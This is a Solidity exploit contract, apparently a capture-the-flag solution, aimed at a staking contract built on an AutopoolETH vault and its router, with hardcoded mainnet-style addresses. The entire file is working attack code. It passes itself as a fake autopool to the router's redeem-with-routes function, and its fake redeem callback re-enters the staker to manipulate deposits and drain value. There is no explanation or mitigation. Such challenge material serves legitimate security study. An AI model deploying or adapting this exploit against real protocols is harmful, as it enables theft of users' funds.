// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "src/Challenge.sol";

contract Exploit {

    Challenge private immutable CHALLENGE;
    LFGStaker staker;
    IWETH9 weth;
    AutopoolETH autoETH;
    IAutopilotRouter router;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
        staker = LFGStaker(CHALLENGE.LFG_STAKER());
        SystemRegistry system = SystemRegistry(0x2218F90A98b0C070676f249EF44834686dAa4285);
        weth = system.weth();
        router = system.autoPoolRouter();
        autoETH = AutopoolETH(challenge.AUTOPOOL_ETH());
        weth.approve(address(router), type(uint).max);
        autoETH.approve(address(staker), type(uint).max);
    }

    function exploit_setup() external payable {
        weth.deposit{value: address(this).balance}();
        router.depositMax(autoETH, address(this), 0);
    }

    function exploit_round() external {
        ISwapRouterV2.UserSwapData[] memory routes = new ISwapRouterV2.UserSwapData[](2);
        routes[0].fromToken = 0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6;
        routes[0].toToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        routes[0].target = address(this);
        routes[0].data = abi.encodeWithSignature("swapCallback()");

        router.redeemWithRoutes(AutopoolETH(address(this)), address(this), 0, 0, routes);
        staker.redeem(staker.balanceOf(address(this)));
    }

    function swapCallback() external {}

    function redeem(uint, address, address) external returns (uint) {
        uint wb = weth.balanceOf(address(autoETH));
        uint b = autoETH.balanceOf(address(this));
        uint sb = autoETH.balanceOf(address(staker));
        if (sb >= wb + 1 ether) {
            staker.deposit(b);
        } else if (b >= wb - sb + 1 ether) {
            staker.deposit(wb - sb);
            staker.deposit(b - (wb - sb));
        } else {
            staker.deposit(b);
        }
        return 0;
    }
}